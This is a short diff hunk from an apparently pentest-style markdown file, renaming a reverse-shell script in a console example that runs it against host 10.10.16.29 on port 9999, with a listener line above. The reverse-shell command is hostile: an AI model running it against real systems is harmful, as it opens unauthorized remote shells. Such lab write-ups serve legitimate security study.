@@ -481,7 +481,7 @@ listening on [any] 9999 ...
 ```
 
 ```console
-p3ntest1ng:~$ python3 autorevsh.py 10.10.16.29 9999
+p3ntest1ng:~$ python3 revsh_earlyaccess.py 10.10.16.29 9999
 ```
 
 ```console
